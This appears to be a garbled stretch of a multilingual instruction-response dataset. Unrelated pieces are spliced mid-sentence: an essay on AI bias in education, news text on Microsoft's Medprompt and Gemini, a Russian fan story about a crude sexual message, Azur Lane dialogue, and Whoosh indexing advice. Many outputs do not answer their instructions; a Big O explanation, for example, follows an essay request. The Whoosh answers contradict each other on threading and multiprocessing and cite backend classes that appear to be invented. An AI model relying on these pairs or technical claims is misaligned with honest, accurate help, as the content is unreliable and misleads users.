социальные последствия (например, работы Мартина Хайдеггера или Карла Маркса), а также обсудить идеи глобализации в контексте работ философов, таких как Жак Деррида и Юрген Хабермас."},{"instruction":"With labelled sections and specificially focussing on bias mitigation and cultural responsiveness, and other synonymous topics, whilst being as professional, eloquent, gramatically impressive, and maintaining the tone that one would when answering an important examination question, please can you answer the following question that shows extensive research that is abundant in detail, is amazingly structured and brilliantly comprehensive, in-depth and insightful, alongside embedding harvard references and having a separate referencing section: “In terms of supporting education (in particular, the critical aspect of the whole learning process), what is currently missing from applications like Chat GPT, Claude 2, Bard etc.)?

Yet, despite their groundbreaking capabilities, there remains room for advancement in ensuring that these AI systems support the critical aspects of the learning process comprehensively. Two areas that demand particular attention are the mitigation of bias and the enhancement of cultural responsiveness. Bias Mitigation in AI Applications The Need for Prejudice-Free Learning Environments Education is grounded in the principle of equal opportunity, wherein all learners must be provided with a fair and unbiased educational experience. However, AI applications may inadvertently perpetuate and amplify societal biases present in their training data, leading to an uneven educational landscape (Bolukbasi et al., 2016). The Absence of Comprehensive Unbiased Frameworks Current AI applications often lack comprehensive frameworks for detecting and mitigating bias (Whittaker et al., 2018). The necessity for algorithms that can identify and rectify data-driven prejudices is paramount since these biases can manifest in skewed content delivery, favoritism in language, or discrimination in interactive learning scenarios. Moving Towards Bias-Mitigation Guardrails Advancements in AI guardrails for bias mitigation should involve the continuous monitoring of AI outputs, deploying diverse datasets for training AI systems, and ensuring transparency in AI decisions (Raji and Smart, 2020). Utilizing audit trails and logs that capture decision-making processes could further fortify bias mitigation strategies. Cultural Responsiveness in AI Applications Understanding the Cultural Tapestry Cultural responsiveness entails the ability of educational tools to reflect and adapt to the diverse cultural backgrounds of learners (Gay, 2018). AI applications may lack the nuanced understanding necessary to accurately represent the cultural contexts of all learners, thereby risking a homogeneous culture-centric approach that overlooks diverse learning needs. Deficiency in Culturally Inclusive Content The absence of culturally inclusive content and the inability to customize learning experiences based on cultural contexts are glaring omissions in today's AI applications (Vossoughi et al., 2016). These applications should be capable of appreciating cultural nuances and adapting content accordingly to provide a more inclusive educational environment. Implementing Culturally Responsive Guardrails For AI to be effectively culturally responsive, it requires implementation of guardrails which ensure that cultural diversity is respected and incorporated into the learning process. This includes conducting thorough cultural audits of the AI's content and language proficiency, and engaging with a wide range of cultural consultants during the development phase (Paris, 2012). Conclusion: Towards an Inclusive Educational AI AI applications have revolutionized education, yet these systems still demand enhanced strategies for bias mitigation and cultural responsiveness. The integration of robust guardrails into AI systems to tackle these issues will not only enforce equality and inclusivity in education but will also resonate with the varied and rich experiences of the learner population. Future research and development should focus on the creation of adaptable, transparent, and accountable AI systems that uphold educational justice and resonance across diverse cultural landscapes.

Can you explain to me what is it in simple terms and how do people calculate what speed their alorithm falls under with these?","output":"In programming, when we talk about the speed or efficiency of an algorithm, we refer to the asymptotic complexity or the \\"Big O\\" notation. It helps us understand how the algorithm's performance scales with the size of the input. In simple terms, Big O notation tells us how much the algorithm's execution time or resource usage will increase as the input grows. It provides an upper bound or worst-case scenario for the algorithm's performance. Here are some commonly used Big O notations: 1. O(1) or Constant Time: This means that the algorithm's runtime or resource usage does not depend on the input size. It remains constant regardless of how large the input is. 2. O(n) or Linear Time: This indicates that the algorithm's execution time or resource usage grows linearly with the input size. If the input is doubled, the algorithm will take roughly twice as long to complete. 3. O(log n) or Logarithmic Time: Here, the algorithm's runtime grows logarithmically with the input size. This means that as the input increases, the algorithm's execution time increases, but at a slower rate compared to linear time. To determine the Big O notation for an algorithm, you need to analyze its code and identify the parts that consume the most time or resources. Key factors to consider are looping structures, recursive calls, and nested operations. Once you identify these parts, you assign a constant value to each operation. Then, analyze how the number of operations changes as the input grows. Simplify the expression and remove constants and low-order terms to find the Big O notation. For example, if you have an algorithm that iterates through a list of size 'n' and performs a constant time operation within each iteration, the algorithm would be O(n). However, if the algorithm divides the input in half with each step (e.g., binary search), it would be O(log n). Note that Big O notation indicates the upper bound of an algorithm's performance; it tells us about the worst-case scenario. In practice, an O(n) algorithm could be faster than an O(log n) algorithm for small input sizes, but as the input grows, the O(log n) algorithm will eventually become more efficient. It's essential to understand Big O notation as it helps in selecting appropriate algorithms and optimizing code for better performance in real-world scenarios."},{"instruction":"","output":"A digital clock or alarm clock would likely use an electric motor to drive the hands or display.

However, the application of artificial intelligence within educational domains is confronting an exigent issue: the inadvertent reflection and perpetuation of extant societal biases, as evidenced in the foundational training datasets of AI systems (Bolukbasi et al., 2016). The lack of robust frameworks within current AI technology to detect and rectify such biases exacerbates this problem, resulting in potential disparities in content delivery methods, linguistic partiality, and discriminatory outcomes within interactive learning environments (Whittaker et al., 2018). It is imperative to advance AI guardrails specifically tailored for bias mitigation. Strategies for such advancements should entail meticulous and ongoing scrutiny of AI outputs, the utilization of multi-faceted and inclusive datasets in the training phase, and an unwavering commitment to the transparency of AI decision-making processes (Raji and Smart, 2020). Incorporating comprehensive audit trails and logs that meticulously document AI decision-making could considerably strengthen bias mitigation tactics. Moreover, cultural responsiveness in educational tools is indispensable. It necessitates AI systems to not only demonstrate a sophisticated understanding of but also to adapt and align with the vast tapestry of learners' cultural backgrounds (Gay, 2018). The present AI applications often exhibit a lack of this nuanced understanding, leading to a monolithic cultural narrative that fails to account for the rich diversity of learners' cultural needs (Vossoughi et al., 2016). To surmount these challenges and ensure AI is effectively culturally responsive, it is essential to embed guardrails that honor and integrate cultural diversity within learning frameworks. This calls for rigorous cultural audits of AI content, evaluation of language nuances, and active collaboration with an array of cultural advisors throughout the AI development process to ensure the delivery of a culturally inclusive and adaptive educational experience (Paris, 2012)."},{"instruction":"please merge and when necessary make the following concise whilst being professional, eloquent, gramatically impressive, maintaining the tone that one would when answering an important examination question, ensuring an abundance of in-depth detail that demonstrates extensive research is present, alongside being brilliantly articulate and expertly insightful and structured: \\"Education is grounded in the principle of equal opportunity, wherein all learners must be provided with a fair and unbiased educational experience.

Nevertheless, the application of artificial intelligence within this domain is fraught with challenges, as AI systems, reflecting societal biases entrenched in their formative data, can unintentionally exacerbate disparities in the learning environment (Bolukbasi et al., 2016). Existing AI mechanisms frequently fall short in encompassing protocols that effectively discern and counteract such biases, which are crucial to address since they can give rise to prejudiced content dissemination, language partiality, and discrimination during interactive learning (Whittaker et al., 2018). To confront these issues, AI must incorporate robust frameworks that prioritize bias mitigation, incorporating measures such as relentless auditing of AI outputs, embracing training on more diverse datasets, and assuring decision-making transparency (Raji and Smart, 2020). Adoption of thorough audit trails and decision logs is imperative to reinforce strategies countering bias. Furthermore, a culturally responsive AI should recognize and adapt to the varied cultural backgrounds of its users. Current AI systems often fail to grasp and accurately reflect such intricacies, resulting in a myopic culture-centric pedagogy that neglects the educational needs of a diverse population (Gay, 2018). The dearth of culturally inclusive materials and the AI's inadequacy to tailor learning to specific cultural milieus represent significant deficiencies (Vossoughi et al., 2016). Effective AI should demonstrate sensitivity to cultural differences and adapt its content to foster an inclusive educational atmosphere. For optimal cultural receptivity, AI applications must be underpinned by safeguards that honor and integrate cultural plurality within the learning framework. This entails thorough cultural assessments of AI content, ensuring language adeptness, and involving a spectrum of cultural experts during the developmental stages (Paris, 2012). Only through such comprehensive and thoughtful interventions can AI ascend to fulfill its potential in offering an education that is as universally inclusive as it is advanced."},{"instruction":"あなたは西暦何年何月何日のデータまで持っていますか？","output":"私の知識は2023年の初めまで更新されています。正確な日付はお伝えできませんが、2023年初旬のデータまで含まれていると考えていただいて結構です。もし最新の情報が必要な場合は、現実世界のデータベースやニュースソースなどをご参照ください。"},{"instruction":"Альтернативная история, близкая к оригиналу, может развиваться следующим образом: Нюта, барабанщица из группы “Ранетки”, сидела во ВКонтакте и внезапно получила сообщение от одного из своих поклонников.

Here are some general patterns that have historically emerged in fictional character representations: **Male Protagonists:** - Historically depicted as more stoic, assertive, and decisive. - Often portrayed as less emotionally expressive, with a focus on action and problem-solving. - Tended to have story arcs revolving around their professional achievements or heroism. - Typically portrayed as leaders or lone figures overcoming adversity with strength and resilience. **Female Protagonists:** - Frequently depicted as nurturing, empathetic, and communicative. - Stories often emphasized relationships, emotional depth, and connection with others. - Protagonists' narratives sometimes centered on romance or family matters. - Often portrayed as supportive characters or as ones undergoing personal transformation through emotional challenges. However, contemporary storytelling has considerably diversified, and these old stereotypes are being challenged and subverted more frequently. Modern media portray protagonists with a wide range of personalities, regardless of gender: - Female protagonists can be depicted as strong, independent, and assertive, taking on roles traditionally reserved for male characters, such as superheroes, political leaders, or antiheroes. - Male protagonists might be shown as emotionally open, vulnerable, and engaging in caregiving roles, breaking away from the \\"stoic hero\\" mold. - There is an increasing presence of characters that are more gender-fluid or non-conforming, who exhibit attributes that fall outside typical binary gender stereotypes. Today, it's more common to see complex characters that blend a variety of traits, showing a full range of human emotions and behaviors. The shift toward more nuanced and realistic portrayals allows audiences to see themselves better represented and to relate more intimately to the characters on screen, regardless of their own gender."},{"instruction":"Can you explain the older and newer biases in the character design in terms of the Five-Factor model?","output":"Certainly. Character design, both in past and present media, often reflects prevailing societal attitudes, which can be interpreted through the lens of the Five-Factor (Big Five) model of personality. Here's a look at how these biases manifest across the five dimensions: **Older Biases in Character Design:** 1. **Openness to Experience (O):** - Male characters might have been depicted as more adventurous, innovative, and open to novel experiences, reflecting traditional hero archetypes. - Female characters were often shown as more cautious and traditional, with a focus on maintaining relationships and social harmony. 2. **Conscientiousness (C):** - Male protagonists often exhibited high conscientiousness through a strong work ethic, ambition, and determination to achieve goals. - Female characters were frequently portrayed as detail-oriented and meticulous when it came to home and family, rather than career or personal achievement. 3. **Extraversion (E):** - Men were commonly depicted as dominant, outspoken, and assertive leaders, which aligns with high extraversion. - Women, in contrast, were generally shown as more reserved or socially supportive rather than socially dominant. 4. **Agreeableness (A):** - Female characters traditionally scored high in agreeableness, being portrayed as cooperative, nurturing, sympathetic, and warm. - Male characters, while often shown as capable of kindness, might have displayed more competitive and tough traits associated with lower agreeableness. 5. **Neuroticism (N):** - Female characters were more likely to be portrayed with traits associated with higher neuroticism, such as being sensitive, vulnerable, and more emotionally reactive. - Male characters were usually less focused on emotional expressiveness and stability, depicting lower neuroticism and more emotional steadiness. **Newer Biases or Trends in Character Design:** 1. **Openness to Experience (O):** - Modern character designs for both genders show a greater variety of traits, with female characters showcased as equally adventurous and imaginative as their male counterparts. 2. **Conscientiousness (C):** - Current female protagonists often embody high conscientiousness related to career and personal goals, breaking away from purely domestic roles. - Male characters are increasingly allowed to exhibit lower conscientiousness traits, questioning traditional values or authority. 3. **Extraversion (E):** - Women in modern media are more frequently depicted as leaders, extroverted, and energetically engaging with their environments. - Men are now also allowed to be introverted, contemplative, and sensitive, breaking away from the always confident and assertive stereotype. 4. **Agreeableness (A):** - Today, there is a trend toward showing both male and female characters with a wide range in agreeableness, with strong, assertive women and empathetic, communicative men. 5. **Neuroticism (N):** - Male characters in contemporary media are increasingly portrayed as wrestling with emotional and psychological complexities, demonstrating a wider range of emotional responsiveness. - While female characters still often grapple with emotional challenges, these are now depicted within a broader context, including stress related to power and career prowess, not just interpersonal relationships. Contemporary media attempt to present more rounded and complex characters who step outside traditional gender roles, with a mix of traits from the Big Five personality dimensions. This shift likely reflects and influences societal changes toward more diverse and inclusive attitudes."},{"instruction":"CONSTRAINTS: 1. ~100k word limit for short term memory.

Read more Last week, Google announced Gemini, its most capable and general model yet. Google Gemini model delivers state-of-the-art performance across many leading benchmarks. Google highlighted that the most capable Gemini Ultra model’s performance exceeds OpenAI GPT-4’s results on 30 of the 32 widely-used academic benchmarks used in large language model (LLM) research and development. Specifically, Gemini Ultra became the first model to outperform human experts on MMLU (massive multitask language understanding) with 90% score, which uses a combination of 57 subjects such as math, physics, history, law, medicine and ethics for testing both world knowledge and problem-solving abilities. Yesterday, Microsoft Research team revealed that OpenAI’s GPT-4 model can beat Google Gemini Ultra when new prompting techniques are used. Last month, Microsoft Research revealed Medprompt, a composition of several prompting strategies that greatly improves GPT-4’s performance and achieves state of the art results in the MultiMedQA suite. Microsoft has now applied the prompting techniques used in Medprompt for general domains as well. According to Microsoft, OpenAI’s GPT-4 model when used with a modified version of Medprompt achieves the highest score ever achieved on the complete MMLU. Yes, OpenAI GPT-4 can beat the upcoming Gemini Ultra model by just by using the prompting techniques. This shows that we have not yet reached the full potential of already released models like GPT-4. Take a look at the benchmark comparison between GPT-4 (improved prompts) and Gemini Ultra models below.

Later, Microsoft increased the number of ensembled calls in Medprompt from five to 20, which lead to the increased score of 89.56%. Microsoft later extended Medprompt to Medprompt+ by adding a simpler prompting method and formulating a policy for deriving a final answer by integrating outputs from both the base Medprompt strategy and the simple prompts. This led GPT-4 reaching a record score of 90.10%. Microsoft Research team mentioned that Google Gemini team was also using similar prompting technique to achieve the record scores on MMLU.

Действительно, концерт был фантастическим, и ей было приятно, что она смогла вызвать у кого-то столь яркие эмоции. Но одна фраза в сообщении вызвала у нее некоторое недоумение. “А минет ты была” - это было слишком откровенное выражение, чего-то неожиданного и неприятного.

Но мне не очень понятно, что ты имеешь в виду, говоря о минете. Может, это некорректное выражение или опечатка?” Нюта надеялась на объяснение или исправление ситуации со стороны поклонника.

Нюта и ее подруги привлекли внимание к проблеме женской безопасности в онлайн-среде и стали активно выступать против такого поведения. Нюта поняла, что хотя было неприятно столкнуться с такими ситуациями, она не должна молчать и терпеть. Вместе с подругами они превратили этот неприятный случай в повод для борьбы за собственные права и защиту от незаконных действий в интернете. Таким образом, альтернативная история развивается в направлении борьбы за женскую безопасность и активного противодействия насилию и домогательствам в онлайн-среде."},{"instruction":"[there would be dialogue in this story:] (It was just another day in the main Azur Lane base.

Bismarck: Oh, you know, just wanted to see how my dear friend is doing. Plus, I may have something interesting to share with you. New Jersey: Interesting? Now, you've got my attention. What's the news? Bismarck: Well, you remember our recent victory against the Sirens, right? New Jersey: How could I forget? We fought tooth and nail to protect the base. Bismarck: Exactly. And our efforts didn't go unnoticed. Admiral Hipper received a message from the Commander, praising our teamwork and leadership. New Jersey: No way! That's fantastic news. Our hard work is paying off. Bismarck: Indeed, New Jersey. It's moments like these that make all the battles worth it. The Commander recognizes our dedication and commitment to Azur Lane. New Jersey: It feels good to be appreciated, doesn't it? Makes me proud to serve alongside you and the rest of the shipgirls. Bismarck: Danke, my friend. I feel the same way. We may come from different factions, but we stand united in our mission to protect humanity. New Jersey: Absolutely. We may have our differences, but when it comes down to it, we're all on the same side. We fight for a better future. Bismarck: That we do, New Jersey.

В сообщении было написано: “Очень мне тогда понравилось с тобой общаться и наслаждаться музыкой на концерте. Ты в этой ночи была просто потрясающей. Пожалуй, это был одно из самых запоминающихся моментов моей жизни.” Нюта улыбнулась, вспоминая тот вечер. Действительно, концерт был фантастическим, и ей было приятно, что она смогла вызвать у кого-то столь яркие эмоции. Но одна фраза в сообщении вызвала у нее некоторое недоумение. “А минет ты была” - это было слишком откровенное выражение, чего-то неожиданного и неприятного. Решив уточнить что они имел ввиду: Нюта решила ответить на сообщение: “Спасибо за комплименты, рада, что концерт оказался для тебя таким запоминающимся. Но мне не очень понятно, что ты имеешь в виду, говоря о минете. Может, это некорректное выражение или опечатка?” Нюта надеялась на объяснение или исправление ситуации со стороны поклонника. Однако, в ответ Нюта получила очень неприятное сообщение со словами, которые еще больше шокировали ее. Оказалось, что поклонник имел в виду нечто совсем непристойное и неуместное. Нюта была взбешена и расстроена таким поворотом событий. поклонник сказал: наш минет был с тобой просто отличным. У меня такого никогда не было. Я наслаждался каждой секундой.\\" ты неудержимо улыбалась, ты","output":"не пропускала ни одной ноты. Я в полном восторге от того, как ты ритмично била в барабаны.\\" Нюта просто не могла поверить, что кто-то мог так перевернуть смысл обычной беседы о музыке. Она чувствовала, что это превращается в неприличную и искаженную историю. Она решила покинуть беседу, не желая продолжать общаться с человеком, который не уважает ее искренность. Нюта рассказала об этом своим подругам из группы \\"Ранетки\\". Они поддержали ее и посоветовали забыть об этом неприятном случае. Вместе они решили, что не стоит доверять и общаться с незнакомыми людьми в интернете, особенно если они проявляют странное поведение. С тех пор Нюта стала осторожнее в интернете, стараясь не открываться незнакомым людям слишком много. Она поняла, что нужно быть осторожным и не верить всему, что говорят. Сцена уследилка (Тайм-машинисты попали в момент, где они получили сообщение с пристороным содержанием): - Подружки, у тебя на телефоне новое сообщение! - воскликнула Оксана, увидев уведомление на экране телефона Нюты. - О, это сообщение от поклонника! - воскликнула Нюта, с открытой радостью доставая свой телефон и начиная читать. - Что он пишет? - спросила Света, интересуясь. - Очень мне тогда понравилось с тобой общаться и наслаждаться музыкой на концерте. Ты в этой ночи была просто потрясающей. Пожалуй, это был одно из самых запоминающихся моментов моей жизни - прочитала Нюта вслух и улыбнулась. - Отлично! - воскликнула Оксана, радуясь за свою подругу. А затем Нюта прочитала следующее сообщение и обнаружила непристойные фразы. Ее улыбка исчезла, а на лице появилось недоумение и озадаченность. - Что там было? - поинтересовалась Света, видя изменившееся выражение лица Нюты. - Это... это что-то непристойное, - сказала Нюта, не веря своим глазам. - Я даже не могу поверить, что кто-то мог написать такое. Девушки взглянули друг на друга, понимая, что это за сообщение. Они были шокированы таким поведением поклонника и не понимали, как такое могло произойти. - Что мы делаем? - спросила Оксана, не зная, как справиться с этой неприятной ситуацией. - Ничего не делаем, - сказала Нюта, решительно закрывая свое сообщение. - Я отвечу, что это неприемлемо и не буду продолжать разговор с ним. Мы не должны давать им власть над нами своими словами. Девушки согласились с Нютой и поддержали ее решение. Они знали, что в интернете встречаются разные люди, и не все из них достойны доверия. Но они не думали, что им придется столкнуться с таким неприятным поведением в своих сообщениях. С тех пор девушки были осторожнее, когда отвечали на сообщения от незнакомых людей. Они понимали, что не все люди могут быть такими, какими они себя представляют. И они были решительными в том, чтобы не позволять непристойным сообщениям влиять на них и их самооценку. И хотя эта ситуация потрясла их, они стояли вместе и были готовы справиться с любыми трудностями, которые могут возникнуть на их пути. Как оказалось, эта неприятная ситуация стала для Нюты и ее подруг уроком осторожности в интернете. Они больше не были наивными и готовыми поверить всему, что им говорят. Они оставались верными себе, не позволяли непристойным комментариям задеть их и продолжали делать то, что им нравилось - играть музыку и радовать своих поклонников."},{"instruction":"какие данные обо мне собирают?

As a trained philosopher, he deals with consciousness, AI, and the question of whether machines can really think or just pretend to. Profile E-Mail Content Summary With Microsoft's Medprompt, GPT-4 outperforms specialized models in medical applications. The prompt has other applications as well. OpenAI GPT-4 has shown in the past that it can answer medical questions with a high degree of accuracy using appropriate prompts. In many cases, however, the large language model still lagged behind specialized variants such as Med-PaLM-2. In a new paper, a Microsoft team has now shown that GPT-4 achieves new benchmarks for medical questions, outperforming even specialized models. This leap is due to a new prompting strategy that combines different approaches and is transferable to other domains. Microsoft's Medprompt combines three methods The method, which they call \\"Medprompt,\\" combines dynamic few-shot selection, self-generated chain-of-thought (CoT), and choice shuffle ensembling.

Share Recommend our article Share The three elements of Medprompt are Dynamic selection of examples: For each question, previously collected similar training examples are selected to provide context to the model. Self-generated Chain of Thought: The model independently generates a CoT prompt using previously automated CoT prompts from training data. Choice Shuffle Ensembling: Answer options are presented multiple times in different order to avoid bias due to the position of the options. The best answer is selected by majority vote from the multiple answers generated in this way. The previously created training examples, which contain questions and answers as well as CoT prompts that led to correct answers, are also automatically generated from benchmarks using GPT-4 and an embedding model. The embeddings are used in the inference phase to find similar examples for the new questions. Medprompt achieves new state-of-the-art in medical benchmarks With Medprompt, the team was able to achieve a GPT-4 hit rate of over 90% on the MedQA dataset for the first time, and the best-reported results on all nine benchmark datasets in the MultiMedQA suite. Further improvements were achieved by increasing the number of few-shot exemplars and the number of ensemble steps. Picture: Microsoft However, the researchers point out that the good performance of GPT-4 with Medprompt in benchmarks does not directly reflect the effectiveness of the model and methods in the real world. Medprompt also shows improvements in other areas The developed prompt is transferable to other applications because it does not require expert knowledge and manual prompt design, as in the Few-Shot examples or the Chain-of-Thought prompt. The team conducted several tests in areas of the MMLU benchmark, such as professional law, professional accounting, philosophy, or professional psychology. In all areas, Medprompt showed an average improvement of 7.3 percent.Recommendation AI research Update GPT-4 architecture, datasets, costs and more leaked Picture: Microsoft The team sees these results as a clear indication that the framework on which Medprompt is based can be generalized to other domains and applications beyond multiple-choice questions.

Use a faster indexing backend: By default, Whoosh uses the pure Python backend. However, you can try using an alternative backend like \`Whoosh.backends.mmap.MmapStorage\` or \`Whoosh.backends.mmap.MmapIndex\` which can significantly improve indexing performance. 2. Use field boost: Assign higher weights to fields that are more important for searching using the \`field.boost\` parameter. This can help prioritize indexing and retrieval of documents. 3. Disable per-document term vectors: If you don't require per-document term vector storage (used for highlighters and other features), you can disable it by setting the \`term_vectors\` parameter to \`False\` when creating the \`Schema\`. 4. Optimize schema definition: Carefully design your \`Schema\` to include only necessary fields. Reducing the number of fields can help improve indexing speed. 5. Optimize document batching: Instead of adding documents one by one, you can batch a number of documents together and then use \`writer.add_documents(documents)\` to add them all at once. This can reduce the overhead of opening and closing the index for each document. 6. Use multiple threads/processes: If your workload allows, you can parallelize the \`add_document\` operation by using multiple threads or processes. Be cautious with this approach as it can introduce synchronization overhead and may require a thread-safe indexer. 7. Optimize document preprocessing: If you perform any pre-processing of the documents before indexing, consider optimizing those steps to reduce their impact on the overall indexing time. It's important to note that the performance gains may vary depending on your specific use case and dataset. It's recommended to profile and benchmark different approaches to find the most effective optimization techniques for your requirements."},{"instruction":"parallelize the add_document operation with threads in whoosh library","output":"To parallelize the \`add_document\` operation with threads in the Whoosh library, you can utilize the \`concurrent.futures\` module in Python.

We submit each document to the executor using the \`submit\` method, which asynchronously schedules the \`add_document\` function to be executed with the given document. Once all the documents have been submitted, we wait for all the futures to complete using \`concurrent.futures.wait\`. This ensures that all documents are added to the index before moving forward. However, it's important to note that the indexing process in Whoosh is not thread-safe. So while parallelism can be achieved by using threads, you must ensure that each thread has its own separate \`IndexWriter\` instance to avoid conflicts."},{"instruction":"parallelize the add_document operation with threading in whoosh library","output":"To parallelize the \`add_document\` operation using threading in the Whoosh library, you can use the \`threading\` module in Python.

We create a lock \`lock\` to synchronize access to the index writer. The \`add_documents_parallel\` function is responsible for adding documents to the index, and it uses the lock to ensure that only one thread accesses the index writer at a time. We split the documents into \`num_threads\` chunks and pass each chunk to a separate thread. Each thread executes the \`add_documents_parallel\` function, adding documents to the index in parallel. Finally, we use \`thread.join()\` to wait for all threads to complete. Note that in this approach, each thread shares the same index writer. Although this can introduce contention and potentially impact performance, it may be sufficient depending on the specific workload. If you anticipate heavy contention or need better performance, you should consider using a thread-safe indexer or alternative parallelization techniques like multiprocessing."},{"instruction":"how to call now() from datetime","output":"To call the \`now()\` function from the \`datetime\` module in Python, you can follow these steps: 1.

We split the documents into \`num_processes\` chunks and pass each chunk to a separate process. The \`add_documents\` function is then applied to each chunk of documents using the \`pool.map\` method, which parallelizes the execution of the function across the processes. Note that each process will have its own separate index writer, which avoids conflicts during simultaneous access to the index. However, keep in mind that the \`Pool\` class from the \`multiprocessing\` module transfers data between processes, so the \`documents\` list should be picklable (serializable). Also, remember to close the \`writer\` instance after adding all documents by calling \`writer.commit()\` to ensure the changes are saved correctly."},{"instruction":"how to use multiprocessing for add_documents in whoosh","output":"Apologies for the confusion in my previous response. The Whoosh library is not compatible with the multiprocessing module due to its reliance on process-level locks for thread-safety. However, you can leverage multi-threading instead.

We split the documents into \`num_threads\` chunks, and each thread processes a separate chunk by calling the \`add_documents\` function. The documents are added to the index concurrently by different threads. Finally, we wait for all threads to complete using \`thread.join()\`. Again, it's important to note that the Whoosh library is not designed for multiprocessing due to its internal process-level locks. Therefore, in these examples, we use multi-threading instead for parallelizing the \`add_documents\` operation."},{"instruction":"AttributeError: Can't pickle local object in multiprocessing library","output":"My apologies for the oversight. Since the \`add_documents\` function in Whoosh uses process-level locks, it cannot be directly used with the \`multiprocessing\` library, as it requires picklable arguments for passing to the worker processes. However, you can modify the implementation to use the \`concurrent.futures\` module for parallelization. Here's an updated example: \`\`\`python import concurrent.futures from whoosh.index import create_in from whoosh.fields import Schema, TEXT # Create the schema schema = Schema(content=TEXT(stored=True)) # Open or create the index index = create_in(\\"index_directory\\", schema) # Function to add documents to the index def add_documents(documents): writer = index.writer() for document in documents: writer.add_document(content=document) writer.commit() # List of documents to add documents = [\\"document1\\", \\"document2\\", \\"document3\\"] # Number of processes to use num_processes = 4 # Split the documents into chunks for parallel processing chunk_size = len(documents) // num_processes document_chunks = [documents[i:i+chunk_size] for i in range(0, len(documents), chunk_size)] # Function to process document chunks def process_documents(document_chunk): add_documents(document_chunk) # Create a ThreadPoolExecutor with concurrent.futures.ThreadPoolExecutor() as executor: # Submit the document chunks to the executor futures = [executor.submit(process_documents, chunk) for chunk in document_chunks] # Wait for all futures to complete concurrent.futures.wait(futures) \`\`\` In this modified example, we use the \`concurrent.futures.ThreadPoolExecutor\` from the \`concurrent.futures\` module instead of \`multiprocessing.Pool\`.

Character names by themselves typically do not reveal crucial plot points or surprise elements that would spoil the experience for someone who has not seen the movie. However, there are some exceptions where the mere mention of a character's name could be considered a spoiler: 1. The character's inclusion is a surprise or a twist: For example, if a character who is presumed dead or has been absent from a franchise for a long time makes an unexpected return, mentioning their name could be a spoiler. 2. The character's name reveals a significant plot point: This might occur in adaptations or sequels where a character's name could signify an important relationship or connection to other characters (e.g., a secret sibling or the true identity of a villain). 3. The release is very recent: For highly-anticipated films or franchise installments, even the smallest details including character names might be considered spoilery shortly after release, as fans typically want to go into these movies knowing as little as possible. 4. Marketing has deliberately kept the character a secret: If promotional materials have intentionally avoided revealing the character, mentioning their name might contradict the marketing strategy and give away a surprise element carefully curated by the creators. Ultimately, whether to provide a spoiler warning is a matter of courtesy and understanding the context of the movie and its audience. If in doubt, it's considerate to err on the side of caution and provide a spoiler warning, or at least ask the audience if they mind potentially spoilery information before sharing the list."},{"instruction":"придумай 10 метафор для описания ситуации, когда ты испытываешь те или иные неудобства, но ты к ним привык и в целом любишь обстановку и не хочешь ее менять","output":"1.

People with chronomania may display excessive punctuality, an obsession with scheduling and planning, and an extreme focus on time management. If you believe you have chronomania or are experiencing symptoms related to an obsession with time, it is important to seek professional help from a mental health specialist, such as a psychiatrist or psychologist. They can provide a proper diagnosis and develop a treatment plan, which may include therapy, medication, or a combination of both to help manage and alleviate the symptoms. Remember that self-diagnosis is not reliable, and it is best to consult a medical professional for an accurate evaluation."},{"instruction":"As chronomanic, I seek to want skip time","output":"As an AI, I can't endorse or support any behavior that may be harmful to yourself or others. Skipping or wanting to skip time can have negative consequences and can interfere with your ability to live in the present moment. It's important to remember that time is a valuable and limited resource, and each moment should be cherished. If you are feeling the need to escape or wanting to skip time, it might be helpful to explore healthier coping mechanisms such as finding activities that bring you joy, practicing mindfulness, or seeking support from friends, family, or professionals."},{"instruction":"Describe chronomanic persons","output":"Chronomania refers to a condition where individuals have an intense preoccupation with time, often leading to an obsession or compulsion to constantly keep track of it. People with chronomanic tendencies may exhibit some of the following characteristics: 1. Constantly aware of the passage of time: Chronomanic individuals have an acute sense of time and are always conscious of its passing. They may frequently check the clock or feel anxious about the passing minutes. 2. Highly organized and punctual: Chronomanic individuals tend to be extremely organized and often strive to be punctual. They may structure their days meticulously, plan activities down to the minute, and become distressed if their schedule is disrupted. 3. Stress about time constraints: A chronomanic person may experience significant stress and anxiety related to time constraints. They may feel overwhelmed by deadlines, highly impatient in waiting situations, or constantly pressurized to finish tasks quickly. 4. Difficulty living in the present moment: Because of their fixation on time, chronomanic individuals can find it challenging to be fully present in the current moment. They may be preoccupied with future obligations or worry about time slipping away. 5. Tendency to rush or multitask excessively: Chronomanic individuals often feel compelled to rush through tasks or multitask excessively to fit more into their schedule. They may find it difficult to relax and prioritize self-care activities due to their pursuit of efficiency and productivity. 6. Perfectionism and time optimization: Chronomanic people may have a strong desire for perfection and efficiency. They strive to make the most of every minute, often seeking ways to optimize their use of time and minimize wastage. 7. Over-reliance on schedules and routines: Chronomanic individuals heavily rely on schedules, routines, and to-do lists to manage their time. Deviations from their predetermined plans can cause distress or unease. It's important to note that not all individuals with a strong awareness of time or a structured approach to their schedule would be considered chronomanic. Chronomania represents an extreme preoccupation with time that can significantly impact one's life and well-being."},{"instruction":"I like the verall build quality of Terra Nova; The New world... It feels so smooth and well built I also like the way its formatted and written","output":"It's great to hear you enjoyed the build quality and the style of \\"Terra Nova: The New World.\\" While I can't provide specific insights into that work (as it's not a widely recognized title at the moment of my knowledge cutoff), your appreciation suggests that the creators have done an excellent job with production design, set construction, storytelling, and possibly the writing if it's a book or the script if it's a series or movie. Production values can greatly enhance the immersion and believability of a fictional world. When a piece of media is well-formatted and written with attention to detail, it makes the experience more enjoyable and engaging for the audience, whether they're reading a book, watching a TV series, or engaging in some other narrative experience. If \\"Terra Nova: The New World\\" is a continuation or reinterpretation of the original \\"Terra Nova\\" television series, which aired in 2011, it's likely that the creators have taken what worked well from the original and refined it. If you appreciate the build quality, perhaps the set design, special effects, and overall aesthetic have been crafted with care and attention to detail that meets or exceeds the standards set by its predecessor. On the other hand, if \\"Terra Nova: The New World\\" is a book or an independent production, then the formatting and writing style would play a significant role in conveying the story effectively, making those elements crucial for a good reader experience.

